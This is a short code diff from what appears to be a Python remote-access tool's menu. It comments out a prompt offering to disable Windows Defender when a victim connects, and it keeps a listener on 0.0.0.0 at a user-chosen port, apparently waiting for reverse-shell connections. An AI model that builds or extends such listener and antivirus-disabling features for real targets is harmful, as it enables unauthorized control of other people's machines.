@@ -269,8 +269,8 @@ if nscan == "3":
     postgen()
 if nscan == '4':
     disable_defender = False
-    opt_mods = input('Do you want me to disable Windows Defender as soon as you connect? (y/n): ')
-    if opt_mods == 'y':
-        disable_defender = True
+    #opt_mods = input('Do you want me to disable Windows Defender as soon as you connect? (y/n): ')
+    #if opt_mods == 'y':
+    #    disable_defender = True
     port = int(input('Please enter the port u want to listen on: '))
     listen('0.0.0.0', port)
